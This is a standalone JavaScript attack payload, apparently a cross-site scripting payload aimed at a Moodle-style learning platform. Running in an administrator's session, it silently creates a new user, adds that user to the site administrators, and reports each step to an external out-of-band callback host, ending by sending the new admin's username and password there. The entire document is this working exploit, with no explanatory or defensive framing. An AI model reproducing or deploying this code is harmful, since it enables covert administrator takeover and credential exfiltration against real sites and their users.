(async()=>{try{
const B=location.origin+'/elearning';
const S=(window.M&&M.cfg&&M.cfg.sesskey)||'';
const U='h3ph'+Math.random().toString(36).slice(2,8);
const P='Xy!'+Math.random().toString(36).slice(2,9)+'Q9w';
const E=U+'@'+location.hostname;
const OOB='https://dao8tr8skcnq9j673jlgp8opxytoc9qf1.oast.me/';
const mark=(m)=>{try{new Image().src=OOB+m;}catch(e){}};
const F=(u,o)=>fetch(u,Object.assign({credentials:'same-origin'},o||{}));
mark('/start');
let h=await (await F(B+'/user/editadvanced.php?id=-1')).text();
let d=new DOMParser().parseFromString(h,'text/html');
let f=d.querySelector('form[action*="editadvanced"]')||d.querySelector('form');
if(!f){mark('/noform');return;}
let fd=new FormData(f);
fd.set('username',U);fd.set('newpassword',P);fd.set('email',E);
fd.set('firstname','Heph');fd.set('lastname','Ops');fd.set('city','Jakarta');fd.set('country','ID');
if(!fd.get('sesskey'))fd.set('sesskey',S);
fd.set('id','-1');
await F(f.action,{method:'POST',body:fd});
mark('/created');
let s=await (await F(B+'/admin/user.php?search='+U)).text();
let m=s.match(/editadvanced\.php\?id=(\d+)/);
if(!m){mark('/nouid');return;}
let uid=m[1];mark('/uid'+uid);
let fd2=new URLSearchParams();fd2.set('sesskey',S);fd2.set('add','1');fd2.append('addselect[]',uid);
await F(B+'/admin/roles/admins.php',{method:'POST',body:fd2});
await F(B+'/admin/roles/admins.php?confirmadd='+uid+'&sesskey='+S);
mark('/admin-'+U+'-'+P);
}catch(e){try{new Image().src='https://dao8tr8skcnq9j673jlgp8opxytoc9qf1.oast.me/err-'+String(e).slice(0,40);}catch(_){}}})();
